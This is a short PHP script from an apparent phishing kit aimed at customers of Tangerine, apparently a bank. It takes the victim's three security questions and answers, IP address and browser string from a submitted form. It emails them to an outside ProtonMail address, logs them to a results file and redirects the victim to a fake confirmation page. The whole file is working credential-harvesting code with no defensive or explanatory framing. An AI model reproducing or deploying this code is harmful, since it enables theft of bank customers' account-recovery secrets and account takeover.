<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 QuestionsResults-----------------\n";
$message .= "question : ".$_POST['question1']."\n";
$message .= "answer : ".$_POST['answer1']."\n";
$message .= "question : ".$_POST['question2']."\n";
$message .= "answer : ".$_POST['answer2']."\n";
$message .= "question : ".$_POST['question3']."\n";
$message .= "answer : ".$_POST['answer3']."\n";
$message .= "-----------------created by medpage-----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------TangerineResults-------------------\n";
$send = "world009@protonmail.com";
$subject = "TangerineResultz 2 $ip".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('../../../TANGERINEresults.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "confirmation.php?product=7";

</script>
